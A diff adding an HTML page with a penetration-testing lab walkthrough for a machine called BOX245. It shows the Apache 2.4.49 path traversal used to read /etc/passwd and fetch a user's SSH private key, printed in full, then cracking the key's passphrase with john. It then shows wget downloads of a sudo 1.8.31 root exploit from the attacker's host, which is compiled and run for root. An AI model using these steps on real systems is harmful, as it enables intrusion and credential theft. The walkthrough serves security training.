@@ -1,0 +1,296 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">BOX245</h1>
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2/246]
+└─$ <u>sudo nmap -p- -sCV 192.168.212.245 --min-rate=10000</u>       
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-20 05:40 EST
+Warning: 192.168.214.246 giving up on port because retransmission cap hit (10).
+Nmap scan report for 192.168.214.246
+Host is up (0.12s latency).
+Not shown: 64013 closed tcp ports (reset), 1519 filtered tcp ports (no-response)
+PORT     STATE SERVICE  VERSION
+80/tcp   open  http     Apache httpd 2.4.52 ((Ubuntu))
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-title: Code Validation
+443/tcp  open  ssl/http Apache httpd 2.4.52 ((Ubuntu))
+| tls-alpn: 
+|_  http/1.1
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=demo
+| Subject Alternative Name: DNS:demo
+| Not valid before: 2022-10-12T07:46:27
+|_Not valid after:  2032-10-09T07:46:27
+|_http-title: Code Validation
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+2222/tcp open  ssh      OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 42:2d:8d:48:ad:10:dd:ff:70:25:8b:46:2e:5c:ff:1d (ECDSA)
+|_  256 aa:4a:c3:27:b1:19:30:d7:63:91:96:ae:63:3c:07:dc (ED25519)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 46.45 seconds
+                                                                                                                                 
+┌──(kali㉿kali)-[~/tempo/lab2/246]
+└─$ cd ../245 
+                                                                                                                                 
+┌──(kali㉿kali)-[~/tempo/lab2/245]
+└─$ cat tcp  
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-20 05:42 EST
+Warning: 192.168.214.245 giving up on port because retransmission cap hit (10).
+Nmap scan report for 192.168.214.245
+Host is up (0.16s latency).
+Not shown: 63875 closed tcp ports (reset), 1655 filtered tcp ports (no-response)
+PORT     STATE SERVICE  VERSION
+21/tcp   open  ftp      vsftpd 2.0.8 or later
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 192.168.45.236
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+80/tcp   open  http     Apache httpd 2.4.49 ((Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8)
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8
+|_http-title: RELIA Corp.
+443/tcp  open  ssl/http Apache httpd 2.4.49 ((Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8)
+| http-methods: 
+|_  Potentially risky methods: TRACE
+| ssl-cert: Subject: commonName=web01.relia.com/organizationName=RELIA/stateOrProvinceName=Berlin/countryName=DE
+| Not valid before: 2022-10-12T08:55:44
+|_Not valid after:  2032-10-09T08:55:44
+|_http-title: RELIA Corp.
+|_http-server-header: Apache/2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+2222/tcp open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 30:0c:6c:9b:ac:07:47:5e:df:6d:ff:38:63:38:2a:fd (RSA)
+|   256 f3:a9:70:76:c8:d4:c4:17:f4:39:1f:be:58:9d:1f:a5 (ECDSA)
+|_  256 21:a0:79:82:2d:e6:2a:76:11:24:2f:7e:2e:a8:c7:83 (ED25519)
+8000/tcp open  http     Apache httpd 2.4.49 ((Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8)
+|_http-server-header: Apache/2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8
+|_http-title: Site doesn't have a title (text/html).
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-open-proxy: Proxy might be redirecting requests
+Service Info: Host: RELIA; OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre></div>
+
+
+<p class="text">It uses ssh and no smb client, so its OS is Linux.</p>
+<p class="text">We can visit websites, but before, we should focus on server version.</p>
+<p class="text">The Apache version 2.4.49 actually has path-traversal vulnerability.</p>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2/245]
+└─$ dirsearch -u http://192.168.212.245       
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                 
+ (_||| _) (/_(_|| (_| )                                                                                                          
+                                                                                                                                 
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /home/kali/tempo/lab2/245/reports/http_192.168.212.245/_25-11-20_09-58-38.txt
+
+Target: http://192.168.212.245/
+
+[09:58:38] Starting:                                                                                                             
+[09:58:40] 403 -  199B  - /%2e%2e//google.com                               
+[09:58:40] 301 -  234B  - /js  ->  http://192.168.212.245/js/               
+[09:58:40] 403 -  199B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd             
+[09:58:43] 403 -  199B  - /.ht_wsr.txt                                      
+[09:58:43] 403 -  199B  - /.htaccess.bak1                                   
+[09:58:43] 403 -  199B  - /.htaccess.orig                                   
+[09:58:43] 403 -  199B  - /.htaccess.save
+[09:58:43] 403 -  199B  - /.htaccess.sample                                 
+[09:58:43] 403 -  199B  - /.htaccess_extra
+[09:58:43] 403 -  199B  - /.htaccess_sc
+[09:58:43] 403 -  199B  - /.htaccess_orig
+[09:58:43] 403 -  199B  - /.htaccessBAK
+[09:58:43] 403 -  199B  - /.htaccessOLD                                     
+[09:58:43] 403 -  199B  - /.htaccessOLD2
+[09:58:43] 403 -  199B  - /.htm
+[09:58:43] 403 -  199B  - /.html
+[09:58:43] 403 -  199B  - /.htpasswds                                       
+[09:58:43] 403 -  199B  - /.httr-oauth                                      
+[09:58:43] 403 -  199B  - /.htpasswd_test
+[09:59:02] 200 -    2KB - <u>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</u>
+[09:59:02] 200 -  820B  - /cgi-bin/printenv                                 
+[09:59:02] 200 -    1KB - /cgi-bin/test-cgi</code></pre></div>
+<p class="text">Dirsearch confirmed it.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/relia/245/1.png' %}" alt="">
+    <p class="text">Yes! We might be able to get ssh key with this vulnerability. There are several users who have bash. <br><br>root:x:0:0:root:/root:/bin/bash <br>
+offsec:x:1000:1000:Offsec Admin:/home/offsec:/bin/bash <br>
+miranda:x:1001:1001:Miranda:/home/miranda:/bin/sh <br>
+steven:x:1002:1002:Steven:/home/steven:/bin/sh <br>
+mark:x:1003:1003:Mark:/home/mark:/bin/sh <br>
+anita:x:1004:1004:Anita:/home/anita:/bin/sh <br>
+sshd:x:113:65534::/run/sshd:/usr/sbin/nologin</p>
+</div>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/relia/245/2.png' %}" alt="">
+    <p class="text">I found id_ecdsa file under the anita folder. We can decrypt it and get password.</p>
+</div>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2/245]
+└─$ echo '-----BEGIN OPENSSH PRIVATE KEY-----                      
+b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAO+eRFhQ
+13fn2kJ8qptynMAAAAEAAAAAEAAABoAAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlz
+dHAyNTYAAABBBK+thAjaRTfNYtnThUoCv2Ns6FQtGtaJLBpLhyb74hSOp1pn0pm0rmNThM
+fArBngFjl7RJYCOTqY5Mmid0sNJwAAAACw0HaBF7zp/0Kiunf161d9NFPIY2bdCayZsxnF
+ulMdp1RxRcQuNoGPkjOnyXK/hj9lZ6vTGwLyZiFseXfRi8Dd93YsG0VmEOm3BWvvCv+26M
+8eyPQgiBD4dPphmNWZ0vQJ6qnbZBWCmRPCpp2nmSaT3odbRaScEUT5VnkpxmqIQfT+p8AO
+CAH+RLndklWU8DpYtB4cOJG/f9Jd7Xtwg3bi1rkRKsyp8yHbA+wsfc2yLWM=
+-----END OPENSSH PRIVATE KEY-----' > id_ecdsa
+                                                                                                                                 
+┌──(kali㉿kali)-[~/tempo/lab2/245]
+└─$ ssh2john id_ecdsa > id_ecdsa.john
+
+┌──(kali㉿kali)-[~/tempo/lab2/245]
+└─$ john id_ecdsa.john --wordlist=/usr/share/wordlists/rockyou.txt
+id_ecdsa:fireball</code></pre></div>
+
+<p class="text">Then, we can use it for ssh connection.</p>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2/245]
+└─$ <u>chmod 600 id_ecdsa</u>
+                                                                                                                                                                                                                                                                 
+┌──(kali㉿kali)-[~/tempo/lab2/245]
+└─$ <u>ssh -i id_ecdsa anita@192.168.212.245 -p 2222</u>
+The authenticity of host '[192.168.212.245]:2222 ([192.168.212.245]:2222)' can't be established.
+ED25519 key fingerprint is SHA256:qFj2zr9FlOzng/oHgJ41UCb4hUyk/xVLo68WPzGE8b4.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:28: [hashed name]
+    ~/.ssh/known_hosts:30: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[192.168.212.245]:2222' (ED25519) to the list of known hosts.
+Enter passphrase for key 'id_ecdsa': 
+Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-128-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu 20 Nov 2025 03:08:19 PM UTC
+
+  System load:  0.0               Processes:               151
+  Usage of /:   67.1% of 7.77GB   Users logged in:         0
+  Memory usage: 14%               IPv4 address for ens192: 192.168.212.245
+  Swap usage:   0%
+
+
+284 updates can be applied immediately.
+218 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+
+Last login: Fri Nov 11 12:06:55 2022 from 192.168.118.2
+$ </code></pre></div>
+
+
+<h2 class="subtitle">PrivEsc</h2>
+
+<div class="code-box"><pre><code>anita@web01:~$ sudo -V
+Sudo version 1.8.31
+Sudoers policy plugin version 1.8.31
+Sudoers file grammar version 46
+Sudoers I/O plugin version 1.8.31</code></pre></div>
+
+<p class="text">There is vulnerability for sudo v1.8.31. Also, we have gcc on the target machine, so it's possible to build exploit code on the target machine.</p>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2/245]
+└─$ git clone https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit.git
+Cloning into 'Sudo-1.8.31-Root-Exploit'...
+remote: Enumerating objects: 9, done.
+remote: Counting objects: 100% (9/9), done.
+remote: Compressing objects: 100% (7/7), done.
+remote: Total 9 (delta 0), reused 6 (delta 0), pack-reused 0 (from 0)
+Receiving objects: 100% (9/9), done.
+                                                                                                                                 
+┌──(kali㉿kali)-[~/tempo/lab2/245]
+└─$ ls
+id_ecdsa  id_ecdsa.john  reports  Sudo-1.8.31-Root-Exploit  tcp  users
+                                                                                                                                 
+┌──(kali㉿kali)-[~/tempo/lab2/245]
+└─$ cd Sudo-*
+                                                                                                                                 
+┌──(kali㉿kali)-[~/tempo/lab2/245/Sudo-1.8.31-Root-Exploit]
+└─$ ls
+exploit.c  Makefile  README.md  shellcode.c
+                                                                                                                                 
+┌──(kali㉿kali)-[~/tempo/lab2/245/Sudo-1.8.31-Root-Exploit]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</code></pre></div>
+
+<div class="code-box"><pre><code>anita@web01:~$ wget http://192.168.45.246/exploit.c
+--2025-11-20 15:16:16--  http://192.168.45.246/exploit.c
+Connecting to 192.168.45.246:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2048 (2.0K) [text/x-csrc]
+Saving to: ‘exploit.c’
+
+exploit.c                        100%[=======================================================>]   2.00K  --.-KB/s    in 0s      
+
+2025-11-20 15:16:16 (4.00 MB/s) - ‘exploit.c’ saved [2048/2048]
+
+anita@web01:~$ wget http://192.168.45.246/Makefile
+--2025-11-20 15:16:28--  http://192.168.45.246/Makefile
+Connecting to 192.168.45.246:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 208 [application/octet-stream]
+Saving to: ‘Makefile’
+
+Makefile                         100%[=======================================================>]     208  --.-KB/s    in 0s      
+
+2025-11-20 15:16:28 (25.0 MB/s) - ‘Makefile’ saved [208/208]
+
+anita@web01:~$ wget http://192.168.45.246/shellcode.c
+--2025-11-20 15:16:35--  http://192.168.45.246/shellcode.c
+Connecting to 192.168.45.246:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 599 [text/x-csrc]
+Saving to: ‘shellcode.c’
+
+shellcode.c                      100%[=======================================================>]     599  --.-KB/s    in 0s      
+
+2025-11-20 15:16:35 (122 MB/s) - ‘shellcode.c’ saved [599/599]
+
+anita@web01:~$ dir
+exploit.c  local.txt  Makefile  shellcode.c
+anita@web01:~$ make
+mkdir libnss_x
+cc -O3 -shared -nostdlib -o libnss_x/x.so.2 shellcode.c
+cc -O3 -o exploit exploit.c
+anita@web01:~$ dir
+exploit  exploit.c  libnss_x  local.txt  Makefile  shellcode.c
+anita@web01:~$ ./exploit
+# id
+uid=0(root) gid=0(root) groups=0(root),998(apache),1004(anita)</code></pre></div>
+<p class="text">I got root user.</p>
+
+</body>
+</html>
